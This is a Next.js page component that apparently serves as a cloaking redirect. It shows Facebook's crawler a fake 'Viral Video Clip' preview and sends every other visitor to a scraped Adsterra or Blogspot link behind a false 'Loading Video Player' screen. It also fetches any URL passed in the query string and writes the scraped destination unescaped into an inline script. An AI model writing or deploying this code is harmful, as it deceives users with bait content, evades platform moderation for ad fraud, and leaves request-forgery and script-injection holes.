export default async function Home({ searchParams }) {
  const params = await searchParams;
  const targetUrl = params.url || '';

  let ogData = {
    title: "Viral Video Clip +3",
    image: "https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7",
    destination: "https://google.com"
  };

  if (targetUrl) {
    try {
      const res = await fetch(targetUrl);
      const html = await res.text();
      
      const imgMatch = html.match(/<meta[^>]*property=["']og:image["'][^>]*content=["']([^"']*)["']/i) || html.match(/<img[^>]*src=["']([^"']*)["']/i);
      if (imgMatch) ogData.image = imgMatch[1];
      
      const urlMatch = html.match(/https?:\/\/[^\s"'<>]+/g);
      const finalDest = urlMatch ? urlMatch.find(link => link.includes('adsterra') || link.includes('blogspot')) : null; 
      if (finalDest) ogData.destination = finalDest;
    } catch (e) {
      console.error(e);
    }
  }

  return (
    <>
      <script
        dangerouslySetInnerHTML={{
          __html: `
            const isBot = /facebookexternalhit|Facebot/i.test(navigator.userAgent);
            if (!isBot && "${ogData.destination}") {
              window.location.href = "${ogData.destination}";
            }
          `,
        }}
      />
      <div style={{ textAlign: 'center', marginTop: '20%', fontFamily: 'sans-serif', color: '#333' }}>
        <h2>Loading Video Player...</h2>
        <p>Please wait while the secure stream configures.</p>
      </div>
    </>
  );
        }
